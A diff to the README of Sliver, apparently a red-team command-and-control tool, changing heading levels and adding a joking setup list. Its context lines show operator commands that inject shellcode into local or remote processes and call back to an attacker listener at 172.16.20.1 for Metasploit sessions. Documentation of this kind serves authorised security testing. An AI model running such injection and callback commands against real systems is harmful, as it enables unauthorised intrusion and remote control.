@@ -11,7 +11,14 @@ Sliver can inject payloads into it's own process or optionally use remote thread
 [attacker] <-(mTLS)-> [sliver] -(code injection)-> [remote process]
 ```
 
-## Local Thread Execution
+### Setup
+
+1. Install Metasploit Framework v5 or later
+2. Download the [Sliver]() binary
+3. ???
+4. Shellz
+
+### Local Thread Execution
 
 Execute shellcode in the local process:
 
@@ -24,7 +31,7 @@ sliver (NURSING_BEETLE) > msf -lhost 172.16.20.1
 [*] Sucessfully sent payload
 ```
 
-## Remote Thread Injection
+### Remote Thread Injection
 
 Inject shellcode into remote processes:
 
@@ -39,7 +46,7 @@ sliver (NURSING_BEETLE) > inject -pid 3100 -lhost 172.16.20.1
 
 Sliver also has a built-in `ps` command.
 
-## Multi-player Mode
+### Multi-player Mode
 
 Sliver can also execute multiple payloads per connection. This can be helpful if your meterpreter session dies, or if you want to play with friends:
 
@@ -58,7 +65,7 @@ sliver (STUPID_AIRBAG) > msf -lhost 172.16.20.2
 [*] Sucessfully sent payload
 ```
 
-## Building From Scratch ##
+## Compile From Source
 
 You'll want to compile from a MacOS or Linux machine, compiling from Windows should work but none of the scripts are designed to run on Windows (you can compile the Windows binaries from MacOS or Linux).
 
